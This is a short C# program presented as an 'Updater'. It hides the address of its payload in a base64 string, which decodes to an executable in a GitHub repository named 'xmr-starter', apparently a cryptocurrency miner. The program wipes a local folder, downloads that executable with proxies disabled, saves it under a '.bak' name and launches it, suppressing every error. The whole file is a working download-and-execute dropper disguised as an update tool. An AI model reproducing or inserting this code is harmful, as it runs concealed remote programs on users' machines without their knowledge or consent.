using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Updater
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
                try
                {
                    if (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) != "")
                    {
                        tempDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "nddi");
                    }
                }catch(Exception)
                { }

                if (!Directory.Exists(tempDirectory))
                {
                    Directory.CreateDirectory(tempDirectory);
                }

                CleanupDir(tempDirectory);

                string tmpExePath = Path.Combine(tempDirectory, "nddi.bak");
                
                string url = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL3pvb2xvb2hvby94bXItc3RhcnRlci9yZWxlYXNlcy9kb3dubG9hZC9MQVRFU1QvbmRkaS5leGU="));

                ServicePointManager.DefaultConnectionLimit = 100;
                WebRequest.DefaultWebProxy = null;

                WebClient client = new WebClient();
                client.Proxy = null;
                client.DownloadFile(url, tmpExePath);

                Process ExternalProcess = new Process();
                ExternalProcess.StartInfo.FileName = tmpExePath;
                ExternalProcess.StartInfo.CreateNoWindow = false;
                ExternalProcess.StartInfo.UseShellExecute = false;
                ExternalProcess.Start();
            }
            catch
            { }
        }

        private static void CleanupDir(string tempDirectory)
        {
            foreach (string f in Directory.GetFiles(tempDirectory))
            {
                try
                {
                    File.Delete(f);
                } catch (Exception)
                { }
            }

            foreach (string d in Directory.GetDirectories(tempDirectory))
            {
                CleanupDir(d);
            }
        }
    }
}
